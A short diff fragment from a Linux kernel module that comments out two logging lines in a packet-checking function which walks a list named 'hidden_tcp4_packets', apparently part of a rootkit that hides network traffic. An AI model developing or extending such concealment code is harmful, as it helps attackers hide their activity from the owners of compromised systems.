@@ -1035,8 +1035,8 @@ int packet_check(struct sk_buff *skb)
 		snprintf(source_ip, 16, "%pI4", &header->saddr);
 		snprintf(dest_ip, 16, "%pI4", &header->daddr);
 
-		pr_info("SOURCE %s", source_ip);
-		pr_info("DEST   %s", dest_ip);
+		//pr_info("SOURCE %s", source_ip);
+		//pr_info("DEST   %s", dest_ip);
 		
 		list_for_each_entry ( hp, &hidden_tcp4_packets, list )
 		{
